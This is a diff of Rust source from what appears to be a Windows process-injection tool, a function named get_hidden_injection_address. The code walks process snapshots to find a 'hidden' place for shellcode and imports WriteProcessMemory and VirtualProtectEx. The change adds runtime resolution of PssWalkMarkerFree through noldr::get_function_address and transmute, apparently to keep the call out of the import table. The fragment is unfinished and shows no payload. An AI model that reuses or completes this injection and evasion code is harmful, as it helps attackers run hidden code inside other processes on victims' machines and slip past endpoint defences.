@@ -3,7 +3,7 @@
 #![allow(dead_code)]
 #![allow(unused_unsafe)]
 
-use noldr::{get_dll_address, get_function_address, get_teb};
+use noldr::get_function_address;
 
 // Standard library imports
 use std::{ffi::c_void as std_c_void, mem::zeroed, ptr::null_mut};
@@ -18,7 +18,7 @@ use winapi::{
         basetsd::SIZE_T, minwindef::{DWORD, FALSE, FARPROC, HMODULE, LPVOID}, winerror::ERROR_SUCCESS
     },
     um::{
-        heapapi::{GetProcessHeap, HeapAlloc, HeapFree}, memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory}, processsnapshot::{PSS_CAPTURE_VA_CLONE, PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION}, winnt::{
+        memoryapi::{VirtualProtectEx, WriteProcessMemory}, processsnapshot::{PSS_CAPTURE_VA_CLONE, PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION}, winnt::{
             CONTEXT, CONTEXT_ALL, HANDLE, HEAP_ZERO_MEMORY, LPCSTR, MEMORY_BASIC_INFORMATION, MEM_IMAGE, PAGE_EXECUTE_READ, PAGE_READWRITE
         }
     },
@@ -28,7 +28,7 @@ use winapi::um::processsnapshot::PSS_CAPTURE_FLAGS as PSS_CAPTURE_FLAGS_winapi;
 
 // Windows-rs imports
 use windows::Win32::System::Diagnostics::ProcessSnapshotting::{
-    PssWalkMarkerCreate, PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_ALLOCATOR,
+    PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_ALLOCATOR,
     PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS, PSS_CAPTURE_THREAD_CONTEXT, PSS_THREAD_ENTRY,
     PSS_VA_SPACE_ENTRY, PSS_WALK_INFORMATION_CLASS, PSS_WALK_THREADS, PSS_WALK_VA_SPACE,
 };
@@ -83,11 +83,11 @@ pub fn get_hidden_injection_address(
 
     //let snapshot = capture_process_snapshot(process_handle)?;
 
-    let mut snapshot_ctx: CONTEXT = unsafe { zeroed() };
+    let snapshot_ctx: CONTEXT = unsafe { zeroed() };
     let mut snapshot_handle = HPSS::default();
-    let mut walk_marker_handle = HPSSWALK::default();
-    let mut thread_entry: PSS_THREAD_ENTRY = unsafe { zeroed() };
-    let mut buffer = vec![0u8; std::mem::size_of::<PSS_THREAD_ENTRY>()];
+    let walk_marker_handle = HPSSWALK::default();
+    let thread_entry: PSS_THREAD_ENTRY = unsafe { zeroed() };
+    let buffer = vec![0u8; std::mem::size_of::<PSS_THREAD_ENTRY>()];
 
     // Capture snapshot
     let capture_flags: PSS_CAPTURE_FLAGS_winapi = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION;
@@ -216,7 +216,7 @@ pub fn get_hidden_injection_address(
                 if va_space_entry.SizeOfImage > 1000000 {
                     //println!("[+] ntdll.dll captured");
 
-                    let mut stack: *mut winapi_c_void = null_mut();
+                    let stack: *mut winapi_c_void = null_mut();
                     let mut stack_offset: usize = 0;
 
                     //locate the function address for ReadProcessMemory
@@ -309,7 +309,18 @@ pub fn get_hidden_injection_address(
 
                         //YOU ARE HERE
 
-                        unsafe { PssWalkMarkerFree(walker) };
+                        //locate the function address for PssWalkMarkerFree
+                        let pss_walk_marker_free_address = noldr::get_function_address(kernel32, "PssWalkMarkerFree");
+
+                        //define the function signature
+                        type PssWalkMarkerFreeFn = unsafe extern "system" fn(HPSSWALK) -> winapi::shared::minwindef::BOOL;
+
+                        //call the function
+                        let pss_walk_marker_free = unsafe {
+                            std::mem::transmute::<_, PssWalkMarkerFreeFn>(pss_walk_marker_free_address.unwrap())
+                        };
+
+                        //unsafe { PssWalkMarkerFree(walker) };
                         //println!("[+] Original base address: {:p}", mem_basic_info.BaseAddress);
                         //println!("[+] Stack offset: {:#x}", stack_offset);
                         //println!("[+] Final shellcode location: {:p}", shellcode_location);
